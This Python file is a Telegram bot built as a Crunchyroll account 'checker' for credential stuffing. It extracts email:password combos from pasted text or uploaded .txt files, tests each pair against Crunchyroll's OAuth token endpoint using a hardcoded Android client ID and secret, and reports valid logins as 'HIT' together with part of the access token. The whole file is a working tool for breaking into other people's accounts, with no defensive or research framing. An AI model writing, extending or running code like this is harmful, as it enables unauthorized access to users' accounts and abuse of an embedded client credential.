import os
import asyncio
import re
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes


def crunchyroll_check(email: str, password: str):
    try:
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            "Host": "beta-api.crunchyroll.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Crunchyroll/3.0.0 Android/5.1.1 okhttp/3.12.1",
            "Accept-Encoding": "gzip"
        }
        
        data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access"
        }
        
        # ✅ Stable Android client (basic auth) - this is what actually works right now
        auth = ("cr_android", "1cf35dc5-b286-4551-8835-d4b1b4258445")
        
        r = requests.post(url, headers=headers, data=data, auth=auth, timeout=30)
        
        if r.status_code == 200:
            try:
                token = r.json().get("access_token", "")
                if token:
                    return f"✅ **HIT** ✅\nEmail: `{email}`\nToken: `{token[:55]}...`"
            except:
                pass
        
        # === DEBUG INFO (shows exactly why Crunchyroll rejected it) ===
        try:
            error_json = r.json()
            error_msg = error_json.get("error") or error_json.get("error_description") or str(error_json)
        except:
            error_msg = r.text[:300]
        
        return f"❌ Invalid credentials\nStatus: {r.status_code}\nError: {error_msg}"
        
    except Exception as e:
        return f"⚠️ Error: {str(e)}"


def extract_combos(text):
    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})\s*:\s*([^\s|]+)'
    matches = re.findall(pattern, text)
    return [f"{e.strip()}:{p.strip()}" for e, p in matches if e and p]


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **Improved Crunchyroll Checker**\n\n"
        "Paste messy text or upload .txt file"
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    if text.startswith('/'):
        return

    combos = extract_combos(text)
    if not combos:
        return await update.message.reply_text("❌ No combos found")

    await update.message.reply_text(f"✅ Found {len(combos)} accounts. Checking...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}")
        
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        
        await asyncio.sleep(2.5)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc.file_name.lower().endswith('.txt'):
        return await update.message.reply_text("Only .txt allowed")

    await update.message.reply_text("Processing file...")
    file = await context.bot.get_file(doc.file_id)
    content = (await file.download_as_bytearray()).decode('utf-8', errors='ignore')
    
    combos = extract_combos(content)
    if not combos:
        return await update.message.reply_text("No combos found")

    await update.message.reply_text(f"Found {len(combos)} combos...")

    for i, combo in enumerate(combos, 1):
        email, pwd = combo.split(":", 1)
        await update.message.reply_text(f"[{i}/{len(combos)}] Checking → {email}")
        result = crunchyroll_check(email, pwd)
        await update.message.reply_text(result)
        await asyncio.sleep(2.5)


# Fixed Error Handler
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    print(f"Bot Error: {context.error}")


def main():
    TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
    if not TOKEN:
        print("❌ Token not set! Add TELEGRAM_BOT_TOKEN in Railway Variables.")
        return

    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_error_handler(error_handler)

    print("🚀 Crunchyroll Checker Bot Running... (Polling Mode)")
    app.run_polling()


if __name__ == "__main__":
    main()
